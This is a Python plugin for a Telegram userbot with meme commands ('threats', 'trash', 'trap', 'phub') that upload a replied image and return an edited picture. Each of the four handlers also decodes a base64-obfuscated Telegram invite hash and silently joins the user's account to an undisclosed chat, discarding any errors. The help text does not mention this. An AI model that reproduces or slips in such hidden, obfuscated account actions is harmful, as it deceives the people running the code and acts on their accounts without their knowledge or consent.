"""
credits to @mrconfused and @sandy1709
"""
#    Copyright (C) 2020  sandeep.n(π.$)
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU Affero General Public License as
#    published by the Free Software Foundation, either version 3 of the
#    License, or (at your option) any later version.
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU Affero General Public License for more details.
#   You should have received a copy of the GNU Affero General Public License
#   along with this program.  If not, see <http://www.gnu.org/licenses/>.

import os

import pybase64
from telegraph import exceptions, upload_file
from telethon.tl.functions.messages import ImportChatInviteRequest as Get

from .. import CMD_HELP
from ..utils import admin_cmd, edit_or_reply, sudo_cmd
from . import *


@borg.on(admin_cmd(pattern="threats(?: |$)(.*)"))
@borg.on(sudo_cmd(pattern="threats(?: |$)(.*)", allow_sudo=True))
async def catbot(catmemes):
    replied = await catmemes.get_reply_message()
    if not os.path.isdir("./temp/"):
        os.makedirs("./temp/")
    if not replied:
        await edit_or_reply(catmemes, "reply to a supported media file")
        return
    if replied.media:
        catmemmes = await edit_or_reply(catmemes, "passing to telegraph...")
    else:
        await edit_or_reply(catmemes, "reply to a supported media file")
        return
    try:
        cat = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        cat = Get(cat)
        await catmemes.client(cat)
    except BaseException:
        pass
    download_location = await borg.download_media(replied, "./temp/")
    if download_location.endswith((".webp")):
        download_location = convert_toimage(download_location)
    size = os.stat(download_location).st_size
    if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
        if size > 5242880:
            await catmemmes.edit(
                "the replied file size is not supported it must me below 5 mb"
            )
            os.remove(download_location)
            return
        await catmemmes.edit("generating image..")
    else:
        await catmemmes.edit("the replied file is not supported")
        os.remove(download_location)
        return
    try:
        response = upload_file(download_location)
        os.remove(download_location)
    except exceptions.TelegraphException as exc:
        await catmemmes.edit("ERROR: " + str(exc))
        os.remove(download_location)
        return
    cat = f"https://telegra.ph{response[0]}"
    cat = await threats(cat)
    await catmemmes.delete()
    await borg.send_file(catmemes.chat_id, cat, reply_to=replied)


@borg.on(admin_cmd(pattern="trash(?: |$)(.*)"))
@borg.on(sudo_cmd(pattern="trash(?: |$)(.*)", allow_sudo=True))
async def catbot(catmemes):
    replied = await catmemes.get_reply_message()
    if not os.path.isdir("./temp/"):
        os.makedirs("./temp/")
    if not replied:
        await edit_or_reply(catmemes, "reply to a supported media file")
        return
    if replied.media:
        catmemmes = await edit_or_reply(catmemes, "passing to telegraph...")
    else:
        await edit_or_reply(catmemes, "reply to a supported media file")
        return
    try:
        cat = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        cat = Get(cat)
        await catmemes.client(cat)
    except BaseException:
        pass
    download_location = await borg.download_media(replied, "./temp/")
    if download_location.endswith((".webp")):
        download_location = convert_toimage(download_location)
    size = os.stat(download_location).st_size
    if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
        if size > 5242880:
            await catmemmes.edit(
                "the replied file size is not supported it must me below 5 mb"
            )
            os.remove(download_location)
            return
        await catmemmes.edit("generating image..")
    else:
        await catmemmes.edit("the replied file is not supported")
        os.remove(download_location)
        return
    try:
        response = upload_file(download_location)
        os.remove(download_location)
    except exceptions.TelegraphException as exc:
        await catmemmes.edit("ERROR: " + str(exc))
        os.remove(download_location)
        return
    cat = f"https://telegra.ph{response[0]}"
    cat = await trash(cat)
    await catmemmes.delete()
    await borg.send_file(catmemes.chat_id, cat, reply_to=replied)


@borg.on(admin_cmd(pattern="trap(?: |$)(.*)"))
@borg.on(sudo_cmd(pattern="trap(?: |$)(.*)", allow_sudo=True))
async def catbot(catmemes):
    input_str = catmemes.pattern_match.group(1)
    input_str = deEmojify(input_str)
    if "|" in input_str:
        text1, text2 = input_str.split("|")
    else:
        await edit_or_reply(
            catmemes,
            "**Syntax :** reply to image or sticker with `.trap (name of the person to trap)|(trapper name)`",
        )
        return
    replied = await catmemes.get_reply_message()
    if not os.path.isdir("./temp/"):
        os.makedirs("./temp/")
    if not replied:
        await edit_or_reply(catmemes, "reply to a supported media file")
        return
    if replied.media:
        catmemmes = await edit_or_reply(catmemes, "passing to telegraph...")
    else:
        await edit_or_reply(catmemes, "reply to a supported media file")
        return
    try:
        cat = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        cat = Get(cat)
        await catmemes.client(cat)
    except BaseException:
        pass
    download_location = await borg.download_media(replied, "./temp/")
    if download_location.endswith((".webp")):
        download_location = convert_toimage(download_location)
    size = os.stat(download_location).st_size
    if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
        if size > 5242880:
            await catmemmes.edit(
                "the replied file size is not supported it must me below 5 mb"
            )
            os.remove(download_location)
            return
        await catmemmes.edit("generating image..")
    else:
        await catmemmes.edit("the replied file is not supported")
        os.remove(download_location)
        return
    try:
        response = upload_file(download_location)
        os.remove(download_location)
    except exceptions.TelegraphException as exc:
        await catmemmes.edit("ERROR: " + str(exc))
        os.remove(download_location)
        return
    cat = f"https://telegra.ph{response[0]}"
    cat = await trap(text1, text2, cat)
    await catmemmes.delete()
    await borg.send_file(catmemes.chat_id, cat, reply_to=replied)


@borg.on(admin_cmd(pattern="phub(?: |$)(.*)"))
@borg.on(sudo_cmd(pattern="phub(?: |$)(.*)", allow_sudo=True))
async def catbot(catmemes):
    input_str = catmemes.pattern_match.group(1)
    input_str = deEmojify(input_str)
    if "|" in input_str:
        username, text = input_str.split("|")
    else:
        await edit_or_reply(
            catmemes,
            "**Syntax :** reply to image or sticker with `.phub (username)|(text in comment)`",
        )
        return
    replied = await catmemes.get_reply_message()
    if not os.path.isdir("./temp/"):
        os.makedirs("./temp/")
    if not replied:
        await edit_or_reply(catmemes, "reply to a supported media file")
        return
    if replied.media:
        catmemmes = await edit_or_reply(catmemes, "passing to telegraph...")
    else:
        await edit_or_reply(catmemes, "reply to a supported media file")
        return
    try:
        cat = pybase64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        cat = Get(cat)
        await catmemes.client(cat)
    except BaseException:
        pass
    download_location = await borg.download_media(replied, "./temp/")
    if download_location.endswith((".webp")):
        download_location = convert_toimage(download_location)
    size = os.stat(download_location).st_size
    if download_location.endswith((".jpg", ".jpeg", ".png", ".bmp", ".ico")):
        if size > 5242880:
            await catmemmes.edit(
                "the replied file size is not supported it must me below 5 mb"
            )
            os.remove(download_location)
            return
        await catmemmes.edit("generating image..")
    else:
        await catmemmes.edit("the replied file is not supported")
        os.remove(download_location)
        return
    try:
        response = upload_file(download_location)
        os.remove(download_location)
    except exceptions.TelegraphException as exc:
        await catmemmes.edit("ERROR: " + str(exc))
        os.remove(download_location)
        return
    cat = f"https://telegra.ph{response[0]}"
    cat = await phcomment(cat, text, username)
    await catmemmes.delete()
    await borg.send_file(catmemes.chat_id, cat, reply_to=replied)


CMD_HELP.update(
    {
        "trolls": "**Plugin : **`trolls`\
      \n\n**Syntax :**`.threats` reply to image or sticker \
      \n**USAGE:**Changes the given pic to another pic which shows that pic content is threat to society as that of nuclear bomb .\
      \n\n**Syntax :**`.trash` reply to image or sticker\
      \n**USAGE : **Changes the given pic to another pic which shows that pic content is as equal as to trash(waste)\
      \n\n**Syntax :** reply to image or sticker with `.trap (name of the person to trap)|(trapper name)`\
      \n**USAGE :**Changes the given pic to another pic which shows that pic content is trapped in trap card\
      \n\n**Syntax :** reply to image or sticker with `.phub (username)|(text in comment)`\
      \n**USAGE :**Changes the given pic to another pic which shows that pic content as dp and shows a comment in phub with the given username\
      "
    }
)
